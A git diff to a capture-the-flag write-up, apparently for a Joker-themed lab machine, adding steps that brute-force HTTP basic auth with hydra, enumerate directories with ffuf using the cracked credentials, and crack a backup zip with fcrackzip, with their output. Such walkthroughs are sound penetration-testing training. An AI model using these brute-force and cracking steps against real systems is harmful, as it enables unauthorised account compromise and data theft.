@@ -40,7 +40,7 @@ Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
 
 http://10.10.68.63/phpinfo.php
 
-## port 8080
+## port 8080 (Brute Force)
 
 basic auth brute force with the user name Joker
 
@@ -50,5 +50,22 @@ hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 -f 10.10.68.63 http-g
 [8080][http-get] host: 10.10.68.63   login: joker   password: hannah
 ```
 
+enum the new web directorys
+
+```bash
+ffuf -u "http://10.10.68.63:8080//FUZZ" -w  /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt  -c   -mc all  -fc 404,403,301 -e .html,.txt,.php,.zip -H "Authorization: Basic am9rZXI6aGFubmFo"
+
+backup                  [Status: 200, Size: 12133560, Words: 0, Lines: 0]
+backup.zip              [Status: 200, Size: 12133560, Words: 0, Lines: 0]
+robots.txt              [Status: 200, Size: 836, Words: 88, Lines: 33]
+robots                  [Status: 200, Size: 836, Words: 88, Lines: 33]
+configuration.php       [Status: 200, Size: 0, Words: 1, Lines: 1]
+htaccess                [Status: 200, Size: 3005, Words: 438, Lines: 81]
+htaccess.txt            [Status: 200, Size: 3005, Words: 438, Lines: 81]
+                        [Status: 200, Size: 10925, Words: 776, Lines: 218]
+```
 
 
+$ fcrackzip -D -p /usr/share/wordlists/rockyou.txt backup                                                    1 ⨯
+possible pw found: hannah ()
+                              
